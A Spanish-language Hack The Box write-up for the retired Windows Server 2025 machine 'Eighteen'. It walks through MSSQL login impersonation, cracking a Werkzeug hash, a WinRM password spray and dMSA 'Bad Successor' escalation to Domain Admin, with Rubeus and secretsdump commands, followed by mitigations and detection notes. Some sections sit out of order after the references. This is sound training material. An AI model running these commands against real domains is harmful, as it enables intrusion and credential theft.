---
machine: Eighteen
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, mssql, impersonation, dmsa, cve-2025-53779, winrm]
---

# Eighteen — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Escenario *assume breach* en Windows Server 2025: dan credenciales MSSQL de baja privilegio. Con `EXECUTE AS LOGIN` se suplanta un login de aplicación y se llega a la base `FinancePlanner`, donde el hash del admin web está en formato **Werkzeug PBKDF2-SHA256**. Se rompe y la contraseña se reutiliza en otro usuario con WinRM. La escalada usa **CVE-2025-53779** ("Bad Successor"): el flujo de migración de **dMSA** permite forjar claves de una cuenta delegada heredando los grupos del predecesor, incluido Domain Admins.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
53/tcp   dns
88/tcp   kerberos-sec
389/tcp  ldap
445/tcp  microsoft-ds
1433/tcp ms-sql-s
5985/tcp wsman
```

Los puertos cantan: DC con MSSQL y WinRM abierto.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
impacket-mssqlclient eighteen.htb/<user>:'<password>'@dc01.eighteen.htb -windows-auth
```

```sql
SELECT name, type_desc FROM sys.server_principals;
SELECT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

```text
sa
finance_app
```

```sql
EXECUTE AS LOGIN = 'finance_app';
SELECT SYSTEM_USER;
USE FinancePlanner;
SELECT username, password_hash FROM admins;
```

```text
admin | pbkdf2:sha256:600000$<salt>$<hash>
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

El fallo está en la migración de **delegated Managed Service Accounts** de Server 2025: quien tenga `CreateChild` sobre la OU (o ACLs sobre un objeto dMSA) puede crear o modificar un dMSA que apunte a un predecesor privilegiado y forzar la migración. El KDC emite el TGT con el PAC del predecesor.

```powershell
Get-ACL "AD:CN=dmsa1,CN=Managed Service Accounts,DC=eighteen,DC=htb" | fl
Set-ADComputer dmsa1 -Replace @{ "msDS-DelegatedMSAState" = 2 }
Rubeus.exe asktgt /user:dmsa1$ /aes256:<key> /domain:eighteen.htb /dc:dc01.eighteen.htb /ptt
```

Con el PAC de Domain Admin en memoria:

```bash
impacket-secretsdump eighteen.htb/'dmsa1$'@dc01.eighteen.htb -k -no-pass
```

## Evidencia

```text
C:\Users\<user>\user.txt          -> <user_flag>
C:\Users\Administrator\root.txt   -> <root_flag>
```

## Lecciones aprendidas

- `IMPERSONATE` en MSSQL es movimiento lateral silencioso: no hace falta `sysadmin`, solo el permiso sobre un login mejor.
- Los hashes de framework (Werkzeug, Django, bcrypt) se reconocen por su prefijo y se atacan con el modo correcto de hashcat.
- Reutilizar la contraseña del panel web en una cuenta de dominio convierte un volcado de BD en acceso remoto.
- Mitigación: quitar `IMPERSONATE` innecesario, parchear CVE-2025-53779, restringir `CreateChild` sobre OUs con dMSA y auditar `msDS-DelegatedMSAState`.

## Mitigaciones y detección

- Activar la preautenticación Kerberos, usar contraseñas largas en cuentas de servicio y forzar AES.
- Detección: 4768 con `PreAuthType=0` y 4769 con RC4 fuera de la línea base.
- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [CVE-2025-53779](https://nvd.nist.gov/vuln/detail/CVE-2025-53779)
- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
- [mssql-exec](../../../knowledge/windows/mssql-exec.md)
## Crackeo del hash Werkzeug

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
admin:<password>
```

## Spray a WinRM

La contraseña del admin web se reutiliza:

```bash
nxc winrm dc01.eighteen.htb -u users.txt -p '<password>' --continue-on-success
```

```text
[+] eighteen.htb\<user2>:<password>
```

```bash
evil-winrm -i dc01.eighteen.htb -u <user2> -p '<password>'
```
